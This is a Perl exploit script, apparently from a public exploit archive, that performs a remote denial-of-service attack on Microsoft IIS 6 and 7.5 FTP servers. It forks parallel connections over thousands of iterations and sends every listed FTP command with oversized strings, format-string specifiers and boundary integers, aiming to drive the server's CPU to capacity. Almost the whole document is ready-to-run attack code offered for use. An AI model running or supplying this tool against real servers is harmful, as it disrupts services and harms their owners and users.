# Author: coolkaveh
# coolkaveh@rocketmail.com
# https://twitter.com/coolkaveh
# Vendor Homepage: http://www.microsoft.com
# Version:  Microsoft IIS 6 , 7.5  FTP Server
# Tested on: windows server 2008 r2 , seven , with two core prossosor
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#When sending multiple parallel FTP command  requests to a Microsoft IIS FTP Server
#CPU usage goes up to max capacity  and server gets non responsive. 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Lame Microsoft IIS FTP Server Remote Denial Of Service
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/perl -w
use IO::Socket;
use Parallel::ForkManager;
$|=1;
sub usage {
    print "FTP Server Remote Denial Of Service\n";
    print "by coolkaveh\n";
    print "usage: perl IISKILLER.pl <host> \n";
    print "example: perl IISKILLER.pl www.example.com \n";
}
$host=shift;
$port=shift || "21";
if(!defined($host)){
    print "FTP Server Remote Denial Of Service\n";
    print "by coolkaveh\n";
    print "usage: perl IISKILLER.pl <host> \n";
    print "example: perl IISKILLER.pl www.example.com \n";
	exit(0);
}
$check_first=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
if(defined $check_first){
	print "$host -> $port is alive.\n";
	$check_first->close;
}
else{
die("$host -> $port is closed!\n");
}
@all=(
&#039;A&#039;x5,&#039;A&#039;x17,&#039;A&#039;x33,&#039;A&#039;x65,&#039;A&#039;x76,&#039;A&#039;x129,&#039;A&#039;x257,&#039;A&#039;x513,&#039;A&#039;x1024,&#039;A&#039;x2049,&#039;A&#039;x4097,&#039;A&#039;x8193,&#039;A&#039;x12288,
&#039;%s%p%x%d&#039;,&#039;024d&#039;,&#039;%.2049d&#039;,&#039;%p%p%p%p&#039;,&#039;%x%x%x%x&#039;,&#039;%d%d%d%d&#039;,&#039;%s%s%s%s&#039;,&#039;%99999999999s&#039;,&#039;%08x&#039;,&#039;%%20d&#039;,&#039;%%20n&#039;,&#039;%%20x&#039;,&#039;%%20s&#039;,
&#039;%s%s%s%s%s%s%s%s%s%s&#039;,&#039;%p%p%p%p%p%p%p%p%p%p&#039;,&#039;%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%&#039;,
&#039;%s&#039;x129,&#039;%x&#039;x257,&#039;-1&#039;,&#039;0&#039;,&#039;0x100&#039;,&#039;0x1000&#039;,&#039;0x3fffffff&#039;,&#039;0x7ffffffe&#039;,&#039;0x7fffffff&#039;,&#039;0x80000000&#039;,&#039;0xfffffffe&#039;,&#039;0xffffffff&#039;,&#039;0x10000&#039;,
&#039;0x100000&#039;,&#039;1&#039;,
&#039;A&#039;x5,&#039;A&#039;x17,&#039;A&#039;x33,&#039;A&#039;x65,&#039;A&#039;x76,&#039;A&#039;x129,&#039;A&#039;x257,&#039;A&#039;x513,&#039;A&#039;x1024,&#039;A&#039;x2049,&#039;A&#039;x4097,&#039;A&#039;x8193,&#039;A&#039;x12288,
&#039;%s%p%x%d&#039;,&#039;024d&#039;,&#039;%.2049d&#039;,&#039;%p%p%p%p&#039;,&#039;%x%x%x%x&#039;,&#039;%d%d%d%d&#039;,&#039;%s%s%s%s&#039;,&#039;%99999999999s&#039;,&#039;%08x&#039;,&#039;%%20d&#039;,&#039;%%20n&#039;,&#039;%%20x&#039;,&#039;%%20s&#039;,
&#039;%s%s%s%s%s%s%s%s%s%s&#039;,&#039;%p%p%p%p%p%p%p%p%p%p&#039;,&#039;%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%&#039;,
&#039;%s&#039;x129,&#039;%x&#039;x257,&#039;-1&#039;,&#039;0&#039;,&#039;0x100&#039;,&#039;0x1000&#039;,&#039;0x3fffffff&#039;,&#039;0x7ffffffe&#039;,&#039;0x7fffffff&#039;,&#039;0x80000000&#039;,&#039;0xfffffffe&#039;,&#039;0xffffffff&#039;,&#039;0x10000&#039;,
&#039;0x100000&#039;,&#039;1&#039;,
);
sub check(){
	#Thread->self->detach;
	$sock=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined $sock){
		#print "$host -> $port is alive.\n";
		undef($content_tmp);
		$sock->recv($content_tmp,100,0);
		if(length($content_tmp)>0){
			$sock->close;
			return 1;
		}else{
			$sock->close;
			return 0;
		}
	}else{
		#print("$host -> $port is closed!\n");
		return 0;
	}
}
@command=(
&#039;NLST&#039;,&#039;CWD&#039;,&#039;STOR&#039;,&#039;RETR&#039;,&#039;MKD&#039;,&#039;RMD&#039;,&#039;DELE&#039;,&#039;RNFR&#039;,&#039;RNTO&#039;,&#039;LIST&#039;,      
&#039;MDTM&#039;,&#039;SIZE&#039;,&#039;STAT&#039;,&#039;ACCT&#039;,&#039;HELP&#039;,&#039;MODE&#039;,&#039;APPE&#039;,&#039;STRU&#039;,&#039;SITE&#039;,
&#039;SITE INDEX&#039;,&#039;TYPE&#039;,&#039;TYPE A&#039;, &#039;TYPE E&#039;, &#039;TYPE L&#039;, &#039;TYPE I&#039;,
&#039;NLST&#039;,&#039;CWD&#039;,&#039;STOR&#039;,&#039;RETR&#039;,&#039;MKD&#039;,&#039;RMD&#039;,&#039;DELE&#039;,&#039;RNFR&#039;,&#039;RNTO&#039;,&#039;LIST&#039;,      
&#039;MDTM&#039;,&#039;SIZE&#039;,&#039;STAT&#039;,&#039;ACCT&#039;,&#039;HELP&#039;,&#039;MODE&#039;,&#039;APPE&#039;,&#039;STRU&#039;,&#039;SITE&#039;,
&#039;SITE INDEX&#039;,&#039;TYPE&#039;,&#039;TYPE A&#039;, &#039;TYPE E&#039;, &#039;TYPE L&#039;, &#039;TYPE I&#039;, 
&#039;NLST&#039;,&#039;CWD&#039;,&#039;STOR&#039;,&#039;RETR&#039;,&#039;MKD&#039;,&#039;RMD&#039;,&#039;DELE&#039;,&#039;RNFR&#039;,&#039;RNTO&#039;,&#039;LIST&#039;,      
&#039;MDTM&#039;,&#039;SIZE&#039;,&#039;STAT&#039;,&#039;ACCT&#039;,&#039;HELP&#039;,&#039;MODE&#039;,&#039;APPE&#039;,&#039;STRU&#039;,&#039;SITE&#039;,
&#039;SITE INDEX&#039;,&#039;TYPE&#039;,&#039;TYPE A&#039;, &#039;TYPE E&#039;, &#039;TYPE L&#039;, &#039;TYPE I&#039;,             
);
print "Start To Dos it!\n";
#enumerate command
$pm = new Parallel::ForkManager(10);
for($i = 1; $i < 9000; $i++) {
my $pid = $pm->start and next;
   COMMANDS: foreach $cmd (@command){
	foreach $poc (@all){
		LABEL5: $sock4=IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>&#039;tcp&#039;, Timeout=>30);
		if(defined($sock4)){
			$sock4->send("$cmd"." "."$poc\r\n", 0);
			$sock4->recv($content, 0, 900);
				}
			}
		}		
$pm->finish; 
}




